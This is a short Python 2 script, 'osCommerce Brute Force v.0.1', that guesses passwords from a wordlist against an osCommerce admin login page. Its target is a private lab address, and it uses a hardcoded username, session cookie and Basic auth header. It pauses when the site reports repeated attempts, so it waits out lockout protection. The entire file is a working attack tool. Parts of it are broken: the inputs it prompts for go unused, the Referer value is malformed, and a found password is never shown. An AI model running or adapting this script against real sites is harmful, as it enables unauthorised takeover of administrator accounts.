#!/usr/bin/env python

import urllib
import urllib2
import sys
import time

print """
osCommerce Brute Force v.0.1
Ken Eddy - files.eddy [at] gmail.com
"""
uri = raw_input("[+] URI path : ")
username = raw_input("[+] osCommerce username : ")
wordlist_path = raw_input("[+] Wordlist path : ")

url = "http://192.168.56.101/oscommerce3/catalog/admin/login.php?action=process"
wordlist_file = open("wordlist.txt",'r')
wordlist = wordlist_file.read().split("\n")
wordlist_file.close()

print "\n\n[i] Brute force started ...\n\n"

for pwd in wordlist:
	identity = {'username':'minato','password':pwd}
	paket = urllib.urlencode(identity)
	print "[*] Trying %s:%s" % (username,pwd)
	req = urllib2.Request(url)
	req.add_header("Authorization","Basic dW55aWw6bWluYXRvMg==")
	req.add_header("Cookie","osCAdminID=3ddy64n7engm3mpe50n4hat1k4umh4wa")
	#352c16bf6df2c40bfa428a69247212ac
	req.add_header("Referer","Referer: http://192.168.56.101/oscommerce3/catalog/admin/login.php?osCAdminID=3ddy64n7engm3mpe50n4hat1k4umh4wa")
	response = urllib2.urlopen(req,paket)
	html = response.read()
	if "Logoff" not in html:
		if "attempts" in html:
			print "[#] Login attempt detected, please wait"
			time.sleep(60)
	elif "Logoff" in html:
		print "\n\n[$] Password FOUND :\n\n"
		sys.exit(0)